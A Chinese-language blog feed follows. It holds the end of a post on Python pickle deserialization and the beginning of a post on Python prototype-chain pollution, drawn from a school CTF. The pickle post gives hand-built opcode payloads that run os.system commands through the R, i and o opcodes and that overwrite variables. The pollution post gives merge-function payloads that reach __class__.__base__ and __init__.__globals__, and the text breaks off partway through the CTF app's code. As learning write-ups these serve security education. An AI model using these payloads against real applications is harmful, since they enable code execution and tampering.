<td style="text-align:right">获得的对象入栈</td>
</tr>
<tr>
<td style="text-align:left">V</td>
<td style="text-align:center">实例化一个UNICODE字符串对象</td>
<td style="text-align:right">Vxxx\n</td>
<td style="text-align:right">获得的对象入栈</td>
</tr>
<tr>
<td style="text-align:left">I</td>
<td style="text-align:center">实例化一个int对象</td>
<td style="text-align:right">Ixxx\n</td>
<td style="text-align:right">获得的对象入栈</td>
</tr>
<tr>
<td style="text-align:left">F</td>
<td style="text-align:center">实例化一个float对象</td>
<td style="text-align:right">Fx.x\n</td>
<td style="text-align:right">获得的对象入栈</td>
</tr>
<tr>
<td style="text-align:left">R</td>
<td style="text-align:center">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td style="text-align:right">R</td>
<td style="text-align:right">函数和参数出栈，函数的返回值入栈</td>
</tr>
<tr>
<td style="text-align:left">.</td>
<td style="text-align:center">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td style="text-align:right">.</td>
<td style="text-align:right">无</td>
</tr>
<tr>
<td style="text-align:left">t</td>
<td style="text-align:center">寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td style="text-align:right">t</td>
<td style="text-align:right">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td style="text-align:left">)</td>
<td style="text-align:center">向栈中直接压入一个空元组</td>
<td style="text-align:right">)</td>
<td style="text-align:right">空元组入栈</td>
</tr>
<tr>
<td style="text-align:left">l</td>
<td style="text-align:center">寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td style="text-align:right">l</td>
<td style="text-align:right">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td style="text-align:left">]</td>
<td style="text-align:center">向栈中直接压入一个空列表</td>
<td style="text-align:right">]</td>
<td style="text-align:right">空列表入栈</td>
</tr>
<tr>
<td style="text-align:left">d</td>
<td style="text-align:center">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td style="text-align:right">d</td>
<td style="text-align:right">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td style="text-align:left">}</td>
<td style="text-align:center">向栈中直接压入一个空字典</td>
<td style="text-align:right">}</td>
<td style="text-align:right">空字典入栈</td>
</tr>
<tr>
<td style="text-align:left">p</td>
<td style="text-align:center">将栈顶对象储存至memo_n</td>
<td style="text-align:right">pn\n</td>
<td style="text-align:right">无</td>
</tr>
<tr>
<td style="text-align:left">g</td>
<td style="text-align:center">将memo_n的对象压栈</td>
<td style="text-align:right">gn\n</td>
<td style="text-align:right">对象被压栈</td>
</tr>
<tr>
<td style="text-align:left">0</td>
<td style="text-align:center">丢弃栈顶对象</td>
<td style="text-align:right">0</td>
<td style="text-align:right">栈顶对象被丢弃</td>
</tr>
<tr>
<td style="text-align:left">b</td>
<td style="text-align:center">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td style="text-align:right">b</td>
<td style="text-align:right">栈上第一个元素出栈</td>
</tr>
<tr>
<td style="text-align:left">s</td>
<td style="text-align:center">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td style="text-align:right">s</td>
<td style="text-align:right">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
</tr>
<tr>
<td style="text-align:left">u</td>
<td style="text-align:center">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td style="text-align:right">u</td>
<td style="text-align:right">MARK标记以及被组合的数据出栈，字典被更</td>
</tr>
<tr>
<td style="text-align:left">a</td>
<td style="text-align:center">将栈的第一个元素append到第二个元素(列表)中</td>
<td style="text-align:right">a</td>
<td style="text-align:right">栈顶元素出栈，第二个元素（列表）被更新</td>
</tr>
<tr>
<td style="text-align:left">e</td>
<td style="text-align:center">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td style="text-align:right">e</td>
<td style="text-align:right">MARK标记以及被组合的数据出栈，列表被更新</td>
</tr>
</tbody>
</table>
</div>
<h3 id="opcode的解析过程"><a href="#opcode的解析过程" class="headerlink" title="opcode的解析过程"></a>opcode的解析过程</h3><p>我这里直接贴图了<br><br>我们可以发现其解析的过程是在栈内实现的。</p>
<h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p>这个模块可以使我们可以更加轻松的阅读opcode<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lalala</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&quot;dir&quot;</span>,))</span><br><span class="line">haha=lalala()</span><br><span class="line">bb=pickle.dumps(haha,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(bb)</span><br><span class="line"><span class="built_in">print</span>(pickletools.dis(bb))</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="string">b&#x27;cnt\nsystem\np0\n(Vdir\np1\ntp2\nRp3\n.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;nt system&#x27;</span></span><br><span class="line">   <span class="number">11</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">14</span>: (    MARK</span><br><span class="line">   <span class="number">15</span>: V        UNICODE    <span class="string">&#x27;dir&#x27;</span></span><br><span class="line">   <span class="number">20</span>: p        PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">23</span>: t        TUPLE      (MARK at <span class="number">14</span>)</span><br><span class="line">   <span class="number">24</span>: p    PUT        <span class="number">2</span></span><br><span class="line">   <span class="number">27</span>: R    REDUCE</span><br><span class="line">   <span class="number">28</span>: p    PUT        <span class="number">3</span></span><br><span class="line">   <span class="number">31</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure></p>
<h3 id="重点分析"><a href="#重点分析" class="headerlink" title="重点分析"></a>重点分析</h3><p>由于我的是windows端所以生成的opcode的第一步c所导入的模块使用的是nt system其中os被替换为nt而nt代表windows系统。然后用p将栈顶进行存储在memo_n，而后使用<code>(</code>压入一个MARK这是为了后面的R来做准备。而后用V压入字符。最后就是t将dir存为元组后使用R来进行函数执行，函数为system，参数为dir。<br>我们经过分析可以发现其是可以命令执行的。即我们在使用pickle.dumps来反序列化上面的opcode会命令执行os.system(‘dir’)<br>但是，我们可以看到直接使用pyhton的pickle.dumps来生成的opcode会以为操作系统的不同而不同而不同，这也就增加了报错的可能。而且使用这个来构造还非常不灵活。所以我们要学会手动构造。</p>
<h1 id="手动构造命令执行的opcode"><a href="#手动构造命令执行的opcode" class="headerlink" title="手动构造命令执行的opcode"></a>手动构造命令执行的opcode</h1><p>我们看上面的常用opcode会发现有三种可以命令执行的opcode，即<code>R</code> <code>o</code> <code>i</code><br>构造基础的难度不高，我们只要构造出os.system(‘calc’)即函数很参数即可<br>如下</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="R"><a href="#R" class="headerlink" title="R"></a>R</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">loads=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;calc&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>我们使用c来获取os.system。之后导入一个MARK这是为了生成元组做的准备（用R来进行命令执行的参数必须为元组），之后就是用S导入一个参数。在用t生成元组，在R来命令执行<br>剩下的也大同小异我就直接写payload了</p>
<h3 id="i"><a href="#i" class="headerlink" title="i"></a>i</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">loads=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;calc&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="o"><a href="#o" class="headerlink" title="o"></a>o</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">loads=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;calc&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="操控实例化对象的属性"><a href="#操控实例化对象的属性" class="headerlink" title="操控实例化对象的属性"></a>操控实例化对象的属性</h2><p>我们可以使用这个来实例化修改一个对象<br>这个opcode也较短我们可以手动构造<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lalala</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">lalala</span></span><br><span class="line"><span class="string">(S&#x27;dazhuang&#x27;</span></span><br><span class="line"><span class="string">S&#x27;benben&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">a=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a.name,a.age)</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">&lt;__main__.lalala <span class="built_in">object</span> at <span class="number">0x000001B52C191250</span>&gt;</span><br><span class="line">dazhuang benben</span><br></pre></td></tr></table></figure><br>构造实例化类的opcode的大体方法与命令执行的方法没有太大的区别，这时因为实例化的过程与函数传参执行的过程非常像<br>我们可以看到当我们反序列化了这个opcode时lalala被实例化了</p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="覆盖导入的其他python文件的变量"><a href="#覆盖导入的其他python文件的变量" class="headerlink" title="覆盖导入的其他python文件的变量"></a>覆盖导入的其他python文件的变量</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">name=<span class="string">&quot;benben&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;secret值为&#x27;</span>+secret.secret)</span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;secret&#x27;</span></span><br><span class="line"><span class="string">S&#x27;hahaha&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;secret值为&#x27;</span>+secret.secret)</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">secret值为lalalala</span><br><span class="line">secret值为hahaha</span><br></pre></td></tr></table></figure>
<p>我们通过<code>c__main__\nsecret</code>来获取导入的secret模块。在利用d操作符来将其变为字典<code>&#123;&#39;secret&#39;:&#39;hahaha&#39;&#125;</code>而后利用d操作符来更新。这就导致了其被覆盖</p>
<h3 id="覆盖当前文件文件下的变量"><a href="#覆盖当前文件文件下的变量" class="headerlink" title="覆盖当前文件文件下的变量"></a>覆盖当前文件文件下的变量</h3><p>对于当前文件下的变量覆盖我们可以使用命令执行函数exec和eval来执行<br>不知道为什么我徒手构造这个一直报错使用这个我就先写一下用<strong>reduce</strong>来构造的方法，因为这个没有设计操作系统的命令执行，所有只要是python环境就可以执行。所有使用<strong>reduce</strong>来构造的即使在其他系统也可以执行。<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot;benben&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;name=&#x27;dazhuang&#x27;&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">opcode_app=pickle.dumps(a,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode_app)</span><br><span class="line">pickle.loads(opcode_app)</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"><span class="string">b&quot;c__builtin__\nexec\np0\n(Vname=&#x27;dazhuang&#x27;\np1\ntp2\nRp3\n.&quot;</span></span><br><span class="line">dazhuang</span><br></pre></td></tr></table></figure></p>
<h1 id="使用Pker来构造"><a href="#使用Pker来构造" class="headerlink" title="使用Pker来构造"></a>使用Pker来构造</h1>]]></content>
      <categories>
        <category>python</category>
        <category>pickle反序列</category>
      </categories>
      <tags>
        <tag>pickle反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>初探python原型链污染</title>
    <url>/2024/03/09/%E5%88%9D%E6%8E%A2python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h1 id="在校赛里我遇到了有关python原型链污染的题目，虽然做了出来但是我个人认为我对这个的了解还是不够的，所以我会写下这篇文章来记录我学习python原型链污染的全部过程"><a href="#在校赛里我遇到了有关python原型链污染的题目，虽然做了出来但是我个人认为我对这个的了解还是不够的，所以我会写下这篇文章来记录我学习python原型链污染的全部过程" class="headerlink" title="在校赛里我遇到了有关python原型链污染的题目，虽然做了出来但是我个人认为我对这个的了解还是不够的，所以我会写下这篇文章来记录我学习python原型链污染的全部过程"></a>在校赛里我遇到了有关python原型链污染的题目，虽然做了出来但是我个人认为我对这个的了解还是不够的，所以我会写下这篇文章来记录我学习python原型链污染的全部过程</h1><h1 id="python原型链污染的成因"><a href="#python原型链污染的成因" class="headerlink" title="python原型链污染的成因"></a>python原型链污染的成因</h1><p>python其实是没有原型这一说法的，只有子类继承父类。但是其继承关系和js的原型比较相似，这也就导致了python也存在与js相似的漏洞(python原型链污染)<br>python原型链污染的主要成因也与js相似都是因为merge这个合并函数错误的将<strong>base</strong>等当成了键值导致其父类被添加了属性，或者被修改了属性的值而导致的污染。<br>下面是一个python的合并函数<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):<span class="comment">#判断dst中是否含有魔术方法__getitem__</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:<span class="comment">#判断dst[k]是否存在，且内容v是否为字典</span></span><br><span class="line">                merge(v, dst.get(k))<span class="comment">#递归合并</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:<span class="comment">#判断dst中是否有k这个属性且v为字典</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))<span class="comment">#递归合并</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)<span class="comment">#如果dst中既没有对应的键 k，也没有与键 k 同名的属性，则直接使用 setattr 将属性 k 设置为值 v。</span></span><br></pre></td></tr></table></figure><br>上面的合并函数对传入的键值并没有做好过滤这也就导致了污染的可能。<br>我们可以用一个实例来解释<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">F</span>:</span><br><span class="line">    a=<span class="string">&quot;hehe&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S_1</span>(<span class="title class_ inherited__">F</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S_2</span>(<span class="title class_ inherited__">F</span>):</span><br><span class="line">    a=<span class="string">&quot;benben&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            <span class="comment">#// 递归合并函数，将dst字典内的数据合并至sec内</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = S_1()</span><br><span class="line">instance2=S_2()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>:</span><br><span class="line">                &#123;<span class="string">&quot;a&quot;</span>: <span class="string">&quot;lalalala&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">F2=F_2()</span><br><span class="line"><span class="built_in">print</span>(instance.__class__.__base__)</span><br><span class="line"><span class="built_in">print</span>(instance.a)</span><br><span class="line">merge(payload,instance)</span><br><span class="line"><span class="built_in">print</span>(instance.a)</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hehe</span><br><span class="line">lalalala</span><br></pre></td></tr></table></figure><br>我们可以看到其输出的值有hehe变成了lalalala这就时候其父类被修改的结果<br>我们可以使用动态调试查看去是在哪里发生了污染。<br><br>在我们调试到最后一步即v不为字典为一个值时发生了污染，这主要是因为这个函数是使用了递归调用。在最后一步<code>setattr(dst, k, v)</code>时跳出了递归，一步步的回去最终污染到了父类（递归说实话还是有点抽象的）。<br>未进入递归<br><br>第一次递归<br><br>第二次递归<br><br>这几次递归最终执行的结果与下面的结果等价<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">instance.__class__.__base__.a=lalalala</span><br></pre></td></tr></table></figure><br>这使得instance的父类中的属性a被修改造成了污染。</p>
<h1 id="Object无法被污染"><a href="#Object无法被污染" class="headerlink" title="Object无法被污染"></a>Object无法被污染</h1><p>python原型链的污染和js还是有所区别的，在js中我们可以污染到object可是python并不行。我们用下面的实例来进行讲解。<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">F</span>:</span><br><span class="line">    a=<span class="string">&quot;hehe&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S_1</span>(<span class="title class_ inherited__">F</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S_2</span>(<span class="title class_ inherited__">F</span>):</span><br><span class="line">    a=<span class="string">&quot;benben&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            <span class="comment">#// 递归合并函数，将dst字典内的数据合并至sec内</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = S_1()</span><br><span class="line">instance2=S_2()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>:</span><br><span class="line">        &#123;<span class="string">&quot;__base__&quot;</span>:</span><br><span class="line">             &#123;<span class="string">&quot;__base__&quot;</span>:</span><br><span class="line">                  &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;lalala&quot;</span>&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">F2=F_2()</span><br><span class="line"><span class="built_in">print</span>(instance.__class__.__base__)</span><br><span class="line"><span class="built_in">print</span>(instance.a)</span><br><span class="line">merge(payload,instance)</span><br><span class="line"><span class="built_in">print</span>(instance.a)</span><br></pre></td></tr></table></figure><br>我们给上面的payload进行更改多加一个<strong>base</strong>尝试污染其父类的父类即object。在运行时便发生了报错<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cannot set &#x27;a&#x27; attribute of immutable type &#x27;object&#x27;</span><br></pre></td></tr></table></figure><br>“无法设置不可变类型 ‘object’ 的 ‘a’ 属性。”<br>尝试给 Python 中的 object 类型的一个实例添加一个名为 ‘a’ 的属性，但是 object 类型是不可变的，因此不能直接给它添加属性。</p>
<h1 id="全局变量的污染-通过init等对全局变量进行污染进行污染"><a href="#全局变量的污染-通过init等对全局变量进行污染进行污染" class="headerlink" title="全局变量的污染(通过init等对全局变量进行污染进行污染)"></a>全局变量的污染(通过<strong>init</strong>等对全局变量进行污染进行污染)</h1><p>首先我们需要了解什么时<code>__init__</code><br>在Python中，<code>__init__</code> 是一个特殊的方法（也称为魔术方法或双下划线方法），用于初始化新创建的对象实例。当你创建一个类的实例时，<code>__init__</code>方法会自动被调用，允许你为对象的属性设置初始值。如果你想要自定义对象的初始化过程，你可以重写（或称为覆盖）这个方法。<br>在python中，函数或者类方法<br>对于类的内置方法比如<code>__init__</code>这些来说，内置方法在并未重写时其数据类型为装饰器wrapperdescripptor，只有在重写之后才是函数function<br>在被重写时其具有<code>__globals__</code>属性，这个属性将函数或者类方法所申明的变量空间的全局变量通过字典的形式返回</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">la</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(A.__init__.__globals__)</span><br><span class="line"><span class="built_in">print</span>(la.__globals__)</span><br><span class="line"><span class="built_in">print</span>(A.__init__.__globals__==la.__globals__)</span><br></pre></td></tr></table></figure>

<p>我们可以看到在类中重写的<code>__init__</code>与函数la的<code>__globals__</code>相同即<code>__init__.__globals__</code>其返回的为改py文件的全局变量空间，即我们可以利用这个来污染所有在改文件下定义的变量<br>我这里使用校题来进行讲解。<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  @Author: hey</span></span><br><span class="line"><span class="string">  @message: Patience is the key in life,I think you&#x27;ll be able to find vulnerabilities in code audits.</span></span><br><span class="line"><span class="string">  * Th3_w0r1d_of_c0d3_1s_be@ut1ful_ but_y0u_c@n’t_c0mp1l3_love.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cannot_be_bypassed</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magicallllll</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> src:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                 <span class="keyword">if</span> key <span class="keyword">in</span> dst <span class="keyword">and</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                    magicallllll(src[key], dst[key])</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     dst[key] = src[key]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[key] = src[key]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> src.items() :</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst,key) <span class="keyword">and</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>):</span><br><span class="line">                magicallllll(value,<span class="built_in">getattr</span>(dst, key))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">setattr</span>(dst, key, value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cannot_be_bypassed(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Hey bro,May be you should check your inputs,because it contains malicious data,Please don&#x27;t hack me~~~ :) :) :)&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Ohhhhhhh,The username or password is incorrect,Please re-register!!!&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            magicallllll(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Ohhhhhhh,The username or password is incorrect,Please re-register!!!&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Congratulations,The username and password is correct,Register Success!!!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Ohhhhhhh,The username or password is incorrect,Please re-register!!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span 